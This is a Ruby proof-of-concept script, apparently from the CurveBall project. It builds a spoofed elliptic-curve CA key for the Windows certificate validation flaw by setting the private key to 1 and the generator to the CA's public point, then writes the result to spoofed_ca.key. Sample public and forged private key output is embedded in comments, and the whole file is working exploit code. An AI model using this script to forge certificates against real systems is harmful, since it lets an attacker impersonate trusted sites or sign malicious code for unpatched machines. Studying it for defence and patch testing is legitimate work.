# From https://github.com/ollypwn/CurveBall
require 'openssl'

raw = File.read ARGV[0]
ca = OpenSSL::X509::Certificate.new(raw) # Read certificate
ca_key = ca.public_key # Parse public key from CA
puts ca_key.to_pem
=begin
-----BEGIN PUBLIC KEY-----
MHYwEAYHKoZIzj0CAQYFK4EEACIDYgAExxEWKnYdVo6+uWJl1MPOtPDDMOyPbddu
ObzISauruONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5fNC3uF/0V
+34nijKh6smPyX4Yyy87LEh6fab0AQes
-----END PUBLIC KEY-----
=end
# File.open("test_ca.key", 'w') { |f| f.write ca_key.to_pem }

ca_key.private_key = 1 # Set a private key, which will match Q = d'G'
group = ca_key.group 
group.set_generator(ca_key.public_key, group.order, group.cofactor)
group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE
ca_key.group = group # Set new group with fake generator G' = Q
puts ca_key.to_pem
=begin
-----BEGIN EC PRIVATE KEY-----
MIIB+gIBAQQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAABoIIBWzCCAVcCAQEwPAYHKoZIzj0BAQIxAP//////////////////
///////////////////////+/////wAAAAAAAAAA/////zB7BDD/////////////
/////////////////////////////v////8AAAAAAAAAAP////wEMLMxL6fiPufk
mI4Fa+P4LRkYHZxu/oFBEgMUCI9QE4daxlY5jYou0Z0qhcjt0+wq7wMVAKM1kmqj
GaJ6HQCJamdzpIJ6zaxzBGEExxEWKnYdVo6+uWJl1MPOtPDDMOyPbdduObzISaur
uONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5fNC3uF/0V+34nijKh
6smPyX4Yyy87LEh6fab0AQesAjEA////////////////////////////////x2NN
gfQ3Ld9YGg2ySLCneuzsGWrMxSlzAgEBoWQDYgAExxEWKnYdVo6+uWJl1MPOtPDD
MOyPbdduObzISauruONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5f
NC3uF/0V+34nijKh6smPyX4Yyy87LEh6fab0AQes
-----END EC PRIVATE KEY-----
=end
File.open("spoofed_ca.key", 'w') { |f| f.write ca_key.to_pem }